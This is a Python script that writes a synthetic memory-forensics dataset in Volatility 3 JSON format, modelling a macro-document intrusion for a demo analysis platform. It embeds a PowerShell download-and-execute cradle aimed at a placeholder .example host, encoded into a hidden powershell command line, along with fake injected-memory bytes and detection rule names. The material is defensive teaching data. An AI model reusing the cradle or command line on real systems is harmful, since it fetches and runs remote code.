"""Generate the SYNTHETIC demo dataset in sample_data/demo_case.

DEMO DATA - NOT REAL FORENSIC EVIDENCE.

This script writes JSON files in the same shape as Volatility 3's JSON renderer
(``vol -r json``) so the platform's real parsers, detection rules, scoring, IOC
extraction, timeline and AI layers can be demonstrated without a memory image.

Safety/ethics of the synthetic data:
* Every external IP is from the RFC 5737 documentation ranges (192.0.2.0/24,
  198.51.100.0/24, 203.0.113.0/24) and every domain uses the RFC 2606 reserved
  ``.example`` TLD - none of them refer to real infrastructure.
* Hexdumps contain only short, publicly documented byte prologues followed by
  zero padding; there is no functional code.
* The scenario (macro document -> encoded PowerShell -> masquerading svchost.exe
  in C:\\Users\\Public with injected memory and a C2-like connection) is a
  textbook teaching pattern.

Run:  python scripts/generate_demo_data.py
"""

from __future__ import annotations

import base64
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "sample_data" / "demo_case"
BOOT = datetime(2026, 3, 14, 8, 1, 0, tzinfo=timezone.utc)
INCIDENT = datetime(2026, 3, 14, 10, 31, 15, tzinfo=timezone.utc)


def ts(dt: datetime | None) -> str | None:
    return dt.isoformat() if dt else None


def boot(seconds: int) -> datetime:
    return BOOT + timedelta(seconds=seconds)


def inc(seconds: int) -> datetime:
    return INCIDENT + timedelta(seconds=seconds)


PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://update-check.example/stage2.ps1')"
ENCODED = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode()
USER_SID = "S-1-5-21-3623811015-3361044348-30300820-1001"

# pid, ppid, name, created, exited, path, cmdline, in_pslist, threads, handles, session, wow64
P = [
    (4, 0, "System", boot(-2), None, None, None, True, 142, 0, None, False),
    (92, 4, "Registry", boot(-4), None, None, None, True, 4, 0, None, False),
    (352, 4, "smss.exe", boot(1), None, r"C:\Windows\System32\smss.exe", r"\SystemRoot\System32\smss.exe", True, 2, 53, None, False),
    (452, 444, "csrss.exe", boot(3), None, r"C:\Windows\system32\csrss.exe",
     r"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows", True, 11, 520, 0, False),
    (528, 444, "wininit.exe", boot(3), None, r"C:\Windows\system32\wininit.exe", "wininit.exe", True, 1, 160, 0, False),
    (540, 520, "csrss.exe", boot(3), None, r"C:\Windows\system32\csrss.exe",
     r"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows", True, 13, 480, 1, False),
    (604, 520, "winlogon.exe", boot(3), None, r"C:\Windows\system32\winlogon.exe", "winlogon.exe", True, 5, 250, 1, False),
    (640, 528, "services.exe", boot(4), None, r"C:\Windows\system32\services.exe", r"C:\Windows\system32\services.exe", True, 7, 610, 0, False),
    (660, 528, "lsass.exe", boot(4), None, r"C:\Windows\system32\lsass.exe", r"C:\Windows\system32\lsass.exe", True, 9, 1290, 0, False),
    (780, 640, "svchost.exe", boot(5), None, r"C:\Windows\system32\svchost.exe", r"C:\Windows\system32\svchost.exe -k DcomLaunch -p", True, 18, 1100, 0, False),
    (832, 528, "fontdrvhost.exe", boot(5), None, r"C:\Windows\system32\fontdrvhost.exe", '"fontdrvhost.exe"', True, 5, 38, 0, False),
    (848, 640, "svchost.exe", boot(5), None, r"C:\Windows\system32\svchost.exe", r"C:\Windows\system32\svchost.exe -k RPCSS -p", True, 10, 860, 0, False),
    (920, 604, "dwm.exe", boot(6), None, r"C:\Windows\system32\dwm.exe", '"dwm.exe"', True, 15, 870, 1, False),
    (1012, 640, "svchost.exe", boot(6), None, r"C:\Windows\system32\svchost.exe", r"C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p", True, 7, 240, 0, False),
    (1104, 640, "svchost.exe", boot(7), None, r"C:\Windows\system32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs -p", True, 42, 1890, 0, False),
    (1340, 640, "spoolsv.exe", boot(9), None, r"C:\Windows\System32\spoolsv.exe", r"C:\Windows\System32\spoolsv.exe", True, 9, 410, 0, False),
    (1520, 640, "svchost.exe", boot(9), None, r"C:\Windows\system32\svchost.exe", r"C:\Windows\system32\svchost.exe -k NetworkService -p", True, 9, 380, 0, False),
    (1868, 640, "MsMpEng.exe", boot(12), None, r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe",
     r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"', True, 33, 640, 0, False),
    (2290, 640, "SearchIndexer.exe", boot(40), None, r"C:\Windows\system32\SearchIndexer.exe", r"C:\Windows\system32\SearchIndexer.exe /Embedding", True, 14, 820, 0, False),
    (3020, 604, "userinit.exe", boot(64), boot(70), None, None, False, 0, 0, 1, False),
    (3120, 3020, "explorer.exe", boot(65), None, r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", True, 72, 2400, 1, False),
    (3388, 1104, "taskhostw.exe", boot(66), None, r"C:\Windows\system32\taskhostw.exe", "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}", True, 9, 300, 1, False),
    (3410, 1104, "sihost.exe", boot(66), None, r"C:\Windows\system32\sihost.exe", "sihost.exe", True, 11, 520, 1, False),
    (3570, 780, "RuntimeBroker.exe", boot(70), None, r"C:\Windows\System32\RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe -Embedding", True, 6, 280, 1, False),
    (3672, 3120, "chrome.exe", boot(900), None, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     r'"C:\Program Files\Google\Chrome\Application\chrome.exe"', True, 38, 1300, 1, False),
    (3700, 3672, "chrome.exe", boot(902), None, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --lang=en-US --renderer-client-id=7', True, 20, 400, 1, False),
    (3901, 3120, "OneDrive.exe", boot(75), None, r"C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
     r'"C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background', True, 24, 900, 1, False),
    (5236, 3120, "notepad.exe", boot(4400), None, r"C:\Windows\system32\notepad.exe",
     r'"C:\Windows\system32\notepad.exe" C:\Users\jdoe\Documents\meeting-notes.txt', True, 3, 230, 1, False),
    # ---- incident chain -------------------------------------------------------------------
    (4012, 3120, "WINWORD.EXE", inc(0), None, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
     r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_March_2026.docm" /o ""', True, 21, 1100, 1, False),
    (4388, 4012, "powershell.exe", inc(27), None, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     f"powershell.exe -nop -w hidden -enc {ENCODED}", True, 14, 610, 1, False),
    (5400, 4388, "conhost.exe", inc(27), None, r"C:\Windows\system32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1", True, 3, 90, 1, False),
    (4460, 4388, "cmd.exe", inc(35), inc(37), None, None, False, 0, 0, 1, False),
    (4528, 4388, "svchost.exe", inc(50), None, r"C:\Users\Public\svchost.exe", r"C:\Users\Public\svchost.exe -k netsvc", True, 6, 210, 1, False),
    (5120, 4528, "rundll32.exe", inc(145), None, r"C:\Windows\system32\rundll32.exe",
     r"rundll32.exe C:\Users\jdoe\AppData\Local\Temp\msupd.dll,DllRegisterServer", True, 4, 120, 1, False),
    (6044, 4528, "updater.exe", inc(200), None, None, None, False, 2, 0, 1, False),  # psscan only -> hidden candidate
]

VOFF = 0xFFFFA00000000000
POFF = 0x0000000010000000


def proc_row(p, idx, physical=False):
    pid, ppid, name, created, exited, path, cmd, *_rest = p
    threads, handles, session, wow64 = p[8], p[9], p[10], p[11]
    off = (POFF + idx * 0x1340) if physical else (VOFF + idx * 0x2C0080)
    return {"PID": pid, "PPID": ppid, "ImageFileName": name[:14], "Offset(V)": off, "Threads": threads,
            "Handles": handles if handles else None, "SessionId": session, "Wow64": wow64,
            "CreateTime": ts(created), "ExitTime": ts(exited), "File output": "Disabled"}


def write(name: str, rows) -> None:
    (OUT / f"{name}.json").write_text(json.dumps(rows, indent=1), encoding="utf-8")


def hexdump(data: bytes, ascii_col: bool = True) -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hx = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{hx}  {asc}" if ascii_col else hx)
    return "\n".join(lines)


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)

    # windows.info --------------------------------------------------------------------------
    write("windows.info", [{"Variable": k, "Value": v} for k, v in [
        ("Kernel Base", 0xF80250000000), ("DTB", 0x1AD000),
        ("Symbols", "file:///volatility3/symbols/windows/ntkrnlmp.pdb/9B2F0A4E7C1D4E2A8F3B6C5D4E3F2A1B-1.json.xz"),
        ("Is64Bit", True), ("IsPAE", False), ("layer_name", "0 WindowsIntel32e"), ("memory_layer", "1 FileLayer"),
        ("KdVersionBlock", 0xF80250C0F400), ("Major/Minor", "15.19041"), ("MachineType", 34404),
        ("KeNumberProcessors", 2), ("SystemTime", "2026-03-14T10:42:17+00:00"), ("NtSystemRoot", "C:\\Windows"),
        ("NtProductType", "NtProductWinNt"), ("NtMajorVersion", 10), ("NtMinorVersion", 0),
        ("PE MajorOperatingSystemVersion", 10), ("PE MinorOperatingSystemVersion", 0), ("PE Machine", 34404),
        ("PE TimeDateStamp", "Mon Dec  9 11:07:51 2019")]])

    # process listings -------------------------------------------------------------------
    write("windows.pslist", [proc_row(p, i) for i, p in enumerate(P) if p[7]])
    write("windows.psscan", [proc_row(p, i, physical=True) for i, p in enumerate(P)])

    live = {p[0]: p for p in P if p[7]}
    children: dict[int, list] = {}
    for p in live.values():
        children.setdefault(p[1], []).append(p)

    def tree_row(p):
        i = P.index(p)
        row = proc_row(p, i)
        row.update({"Audit": ("\\Device\\HarddiskVolume3" + p[5][2:]) if p[5] else None, "Cmd": p[6], "Path": p[5]})
        kids = sorted(children.get(p[0], []), key=lambda q: q[0])
        row["__children"] = [tree_row(k) for k in kids]
        return row

    roots = sorted((p for p in live.values() if p[1] not in live), key=lambda q: q[0])
    write("windows.pstree", [tree_row(r) for r in roots])

    write("windows.cmdline", [{"PID": p[0], "Process": p[2][:14],
                               "Args": p[6] if p[6] else ("Required memory at 0x20 is not valid (process exited?)"
                                                          if p[0] in (4, 92) else None)} for p in live.values()])

    # modules -----------------------------------------------------------------------------
    common = [("ntdll.dll", r"C:\Windows\SYSTEM32\ntdll.dll"), ("KERNEL32.DLL", r"C:\Windows\System32\KERNEL32.DLL"),
              ("KERNELBASE.dll", r"C:\Windows\System32\KERNELBASE.dll")]
    extra = {
        4528: [("WS2_32.dll", r"C:\Windows\System32\WS2_32.dll"), ("WININET.dll", r"C:\Windows\System32\WININET.dll"),
               ("msupd.dll", r"C:\Users\jdoe\AppData\Local\Temp\msupd.dll")],
        5120: [("msupd.dll", r"C:\Users\jdoe\AppData\Local\Temp\msupd.dll"),
               ("WS2_32.dll", r"C:\Windows\System32\WS2_32.dll")],
        4388: [("System.Management.Automation.ni.dll",
                r"C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\System.Management.Automation.ni.dll"),
               ("amsi.dll", r"C:\Windows\SYSTEM32\amsi.dll")],
        3901: [("FileSyncClient.dll", r"C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\24.201.1006.0005\FileSyncClient.dll")],
        4012: [("VBE7.DLL", r"C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\VBA\VBA7.1\VBE7.DLL")],
    }
    mods = []
    for p in live.values():
        if not p[5]:
            continue
        created = p[3]
        base = 0x7FF600000000 + p[0] * 0x100000
        entries = [(p[2], p[5])] + common + extra.get(p[0], [])
        for j, (n, path) in enumerate(entries):
            load = created + timedelta(seconds=(4 if n == "msupd.dll" and p[0] == 4528 else 0) + j * 0.01)
            mods.append({"PID": p[0], "Process": p[2][:14], "Base": base + j * 0x200000, "Size": 0x1F000 + j * 0x1000,
                         "Name": n, "Path": path, "LoadTime": ts(load), "File output": "Disabled"})
    write("windows.dlllist", mods)

    # malfind -----------------------------------------------------------------------------
    pe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\xb8" + b"\x00" * 7 + b"\x40" + b"\x00" * 39
    shell = b"\xfc\x48\x83\xe4\xf0\xe8" + b"\x00" * 58
    normal = b"\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x48\x8b\xd9\xe8" + b"\x00" * 50
    zeros = b"\x00" * 64
    write("windows.malfind", [
        {"PID": 4528, "Process": "svchost.exe", "Start VPN": 0x1E0000, "End VPN": 0x1FFFFF, "Tag": "VadS",
         "Protection": "PAGE_EXECUTE_READWRITE", "CommitCharge": 32, "PrivateMemory": 1, "File output": "Disabled",
         "Notes": "MZ header", "Hexdump": hexdump(pe), "Disasm": "0x1e0000: dec ebp\n0x1e0001: pop edx\n0x1e0002: nop"},
        {"PID": 4528, "Process": "svchost.exe", "Start VPN": 0x2A0000, "End VPN": 0x2A0FFF, "Tag": "VadS",
         "Protection": "PAGE_EXECUTE_READWRITE", "CommitCharge": 1, "PrivateMemory": 1, "File output": "Disabled",
         "Notes": None, "Hexdump": hexdump(shell),
         "Disasm": "0x2a0000: cld\n0x2a0001: and rsp, 0xfffffffffffffff0\n0x2a0005: call 0x2a00ca"},
        {"PID": 1868, "Process": "MsMpEng.exe", "Start VPN": 0x22B7C510000, "End VPN": 0x22B7C51FFFF, "Tag": "VadS",
         "Protection": "PAGE_EXECUTE_READWRITE", "CommitCharge": 16, "PrivateMemory": 1, "File output": "Disabled",
         "Notes": None, "Hexdump": hexdump(normal), "Disasm": "mov qword ptr [rsp + 8], rbx\npush rdi\nsub rsp, 0x20"},
        {"PID": 3700, "Process": "chrome.exe", "Start VPN": 0x1C2A0040000, "End VPN": 0x1C2A007FFFF, "Tag": "VadS",
         "Protection": "PAGE_EXECUTE_READ", "CommitCharge": 64, "PrivateMemory": 1, "File output": "Disabled",
         "Notes": None, "Hexdump": hexdump(zeros), "Disasm": "add byte ptr [rax], al"},
    ])

    # network -----------------------------------------------------------------------------
    net = [
        ("TCPv4", "0.0.0.0", 135, "0.0.0.0", 0, "LISTENING", 848, "svchost.exe", boot(6)),
        ("TCPv4", "0.0.0.0", 49664, "0.0.0.0", 0, "LISTENING", 660, "lsass.exe", boot(5)),
        ("TCPv4", "0.0.0.0", 49665, "0.0.0.0", 0, "LISTENING", 528, "wininit.exe", boot(5)),
        ("TCPv4", "0.0.0.0", 49666, "0.0.0.0", 0, "LISTENING", 1104, "svchost.exe", boot(8)),
        ("TCPv4", "0.0.0.0", 49667, "0.0.0.0", 0, "LISTENING", 1340, "spoolsv.exe", boot(10)),
        ("UDPv4", "0.0.0.0", 5353, "*", 0, None, 1520, "svchost.exe", boot(12)),
        ("UDPv4", "10.0.2.15", 137, "*", 0, None, 4, "System", boot(15)),
        ("TCPv4", "10.0.2.15", 49710, "192.0.2.80", 443, "ESTABLISHED", 3672, "chrome.exe", boot(905)),
        ("TCPv4", "10.0.2.15", 49712, "192.0.2.81", 443, "ESTABLISHED", 3672, "chrome.exe", boot(1300)),
        ("TCPv4", "10.0.2.15", 49690, "192.0.2.120", 443, "ESTABLISHED", 3901, "OneDrive.exe", boot(90)),
        ("TCPv4", "10.0.2.15", 49701, "192.0.2.200", 443, "CLOSE_WAIT", 1104, "svchost.exe", boot(300)),
        ("TCPv4", "10.0.2.15", 49728, "198.51.100.77", 443, "CLOSED", 4012, "WINWORD.EXE", inc(5)),
        ("TCPv4", "10.0.2.15", 49731, "203.0.113.45", 80, "CLOSED", 4388, "powershell.exe", inc(29)),
        ("TCPv4", "10.0.2.15", 49733, "203.0.113.45", 4444, "ESTABLISHED", 4528, "svchost.exe", inc(56)),
        ("TCPv4", "10.0.2.15", 49740, "198.51.100.23", 443, "ESTABLISHED", 5120, "rundll32.exe", inc(151)),
        ("TCPv4", "10.0.2.15", 49702, "10.0.2.3", 53, "CLOSED", 1520, "svchost.exe", boot(400)),
    ]
    write("windows.netscan", [{"Offset": 0xC88A2B000000 + i * 0x1A0, "Proto": n[0], "LocalAddr": n[1],
                               "LocalPort": n[2], "ForeignAddr": n[3], "ForeignPort": n[4], "State": n[5],
                               "PID": n[6], "Owner": n[7], "Created": ts(n[8])} for i, n in enumerate(net)])

    # targeted deep-dive plugins (rows exist only for the PIDs the pipeline will triage) -------------
    vads = [
        (4528, 0x1E0000, 0x1FFFFF, "VadS", "PAGE_EXECUTE_READWRITE", 1, None),
        (4528, 0x2A0000, 0x2A0FFF, "VadS", "PAGE_EXECUTE_READWRITE", 1, None),
        (4528, 0x3B0000, 0x3B0FFF, "VadS", "PAGE_EXECUTE_READ", 1, None),
        (4528, 0x7FF601C00000, 0x7FF601C1EFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Users\Public\svchost.exe"),
        (4528, 0x7FF601E00000, 0x7FF601E2FFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (4528, 0x500000, 0x5FFFFF, "VadS", "PAGE_READWRITE", 1, None),
        (5120, 0x7FF601400000, 0x7FF60141EFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Windows\System32\rundll32.exe"),
        (5120, 0x7FF601600000, 0x7FF60162FFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (5120, 0x7FF601900000, 0x7FF60191FFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Users\jdoe\AppData\Local\Temp\wmcore.dll"),
        (4388, 0x7FF600200000, 0x7FF60021EFFF, "Vad", "PAGE_EXECUTE_WRITECOPY", 0, r"\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        (4388, 0x1D8E0000, 0x1D8EFFFF, "VadS", "PAGE_EXECUTE_READWRITE", 1, None),
        (1868, 0x22B7C510000, 0x22B7C51FFFF, "VadS", "PAGE_EXECUTE_READWRITE", 1, None),
    ]
    write("windows.vadinfo", [{"PID": v[0], "Process": live[v[0]][2][:14], "Offset": 0xFFFFA0000F000000 + i * 0x80,
                               "Start VPN": v[1], "End VPN": v[2], "Tag": v[3], "Protection": v[4],
                               "CommitCharge": 1, "PrivateMemory": v[5], "Parent": 0, "File": v[6],
                               "File output": "Disabled"} for i, v in enumerate(vads)])

    ldr = [
        (5120, 0x7FF601400000, True, False, True, r"\Windows\System32\rundll32.exe"),
        (5120, 0x7FF601600000, True, True, True, r"\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (5120, 0x7FF601900000, False, False, False, r"\Users\jdoe\AppData\Local\Temp\wmcore.dll"),
        (5120, 0x7FFD12340000, True, True, True, r"\Windows\System32\ntdll.dll"),
        (4528, 0x7FF601C00000, True, False, True, r"\Users\Public\svchost.exe"),
        (4528, 0x7FF601E00000, True, True, True, r"\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (4388, 0x7FF600200000, True, False, True, r"\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ]
    write("windows.ldrmodules", [{"Pid": l[0], "Process": live[l[0]][2][:14], "Base": l[1], "InLoad": l[2],
                                  "InInit": l[3], "InMem": l[4], "MappedPath": l[5]} for l in ldr])

    handles = [
        (4528, 0x4, "Process", 0x1010, "lsass.exe Pid 660"),
        (4528, 0x8, "Key", 0x20019, r"MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN"),
        (4528, 0xC, "Mutant", 0x1F0001, r"Global\MSUpd_7f3a2c"),
        (4528, 0x10, "File", 0x12019F, r"\Device\HarddiskVolume3\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (4528, 0x14, "Thread", 0x1FFFFF, "Tid 6050 Pid 6044"),
        (4388, 0x4, "File", 0x100020, r"\Device\HarddiskVolume3\Users\jdoe\Downloads"),
        (4388, 0x8, "Process", 0x1FFFFF, "svchost.exe Pid 4528"),
        (5120, 0x4, "File", 0x120089, r"\Device\HarddiskVolume3\Users\jdoe\AppData\Local\Temp\msupd.dll"),
        (1868, 0x4, "Process", 0x1410, "lsass.exe Pid 660"),
    ]
    write("windows.handles", [{"PID": h[0], "Process": live[h[0]][2][:14], "Offset": 0xFFFFA0000E000000 + i * 0x30,
                               "HandleValue": h[1], "Type": h[2], "GrantedAccess": h[3], "Name": h[4]}
                              for i, h in enumerate(handles)])

    sid_rows = []
    for pid in (4528, 4388, 5120, 1868, 3700):
        if pid == 1868:
            sid_rows.append({"PID": pid, "Process": "MsMpEng.exe", "SID": "S-1-5-18", "Name": "Local System"})
        else:
            sid_rows += [{"PID": pid, "Process": live[pid][2][:14], "SID": USER_SID, "Name": "jdoe"},
                         {"PID": pid, "Process": live[pid][2][:14], "SID": "S-1-5-32-545", "Name": "Users"},
                         {"PID": pid, "Process": live[pid][2][:14], "SID": "S-1-16-8192",
                          "Name": "Medium Mandatory Level"}]
    write("windows.getsids", sid_rows)

    privs = [
        (4528, "SeDebugPrivilege", "Present,Enabled", 20), (4528, "SeChangeNotifyPrivilege", "Present,Enabled,Default", 23),
        (4388, "SeDebugPrivilege", "Present", 20), (4388, "SeChangeNotifyPrivilege", "Present,Enabled,Default", 23),
        (5120, "SeChangeNotifyPrivilege", "Present,Enabled,Default", 23),
        (1868, "SeDebugPrivilege", "Present,Enabled", 20),
    ]
    write("windows.privileges", [{"PID": p[0], "Process": live[p[0]][2][:14], "Value": p[3], "Privilege": p[1],
                                  "Attributes": p[2], "Description": ""} for p in privs])

    write("windows.vadyarascan", [
        {"Offset": 0x1E1A40, "PID": 4528, "Rule": "Reflective_Loader_Export_String", "Component": "$s1",
         "Value": "5265666c6563746976654c6f61646572"},
        {"Offset": 0x1D8E1F00, "PID": 4388, "Rule": "PowerShell_Download_Cradle_Strings", "Component": "$a",
         "Value": "446f776e6c6f6164537472696e67"},
    ])

    (OUT / "manifest.json").write_text(json.dumps({
        "name": "MemTrace synthetic demo case",
        "version": "1.0",
        "notice": "DEMO DATA - NOT REAL FORENSIC EVIDENCE. Synthetic Volatility 3-format JSON for demonstration only.",
        "scenario": "A user opens a macro-enabled document; WINWORD spawns encoded PowerShell, which retrieves a "
                    "second stage, drops a masquerading svchost.exe in C:\\Users\\Public and launches rundll32 with a "
                    "DLL from %TEMP%. The fake svchost shows injected executable memory with a PE header, a "
                    "C2-like connection and a handle to lsass.exe. A child process is unlinked from the active list.",
        "addresses": "All external IPs are RFC 5737 documentation addresses; domains use the RFC 2606 .example TLD.",
        "generated_by": "scripts/generate_demo_data.py",
    }, indent=2), encoding="utf-8")
    print(f"Synthetic demo dataset written to {OUT}")


if __name__ == "__main__":
    main()
